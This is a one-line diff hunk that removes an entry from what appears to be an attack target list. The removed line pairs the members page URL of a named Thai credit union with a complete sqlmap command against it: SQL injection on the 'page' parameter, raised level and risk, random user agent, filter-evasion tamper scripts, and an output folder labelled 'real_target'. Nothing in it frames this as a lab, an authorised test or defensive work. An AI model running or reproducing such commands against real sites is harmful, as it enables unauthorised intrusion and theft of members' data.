@@ -1,1 +1,0 @@
-https://peacoop.or.th/members?id=1&page=1 (GET)  # C:\Users\Administrator\AppData\Local\Programs\Python\Python311\Scripts\sqlmap -u https://peacoop.or.th/members?id=1&page=1 -p page --batch --level=2 --risk=2 --random-agent --tamper=space2comment,randomcase --output-dir real_target_sqlmap_20251029_025219\Peacoop_Credit_Union_1_page_added --fresh-queries --timeout=60 --retries=1
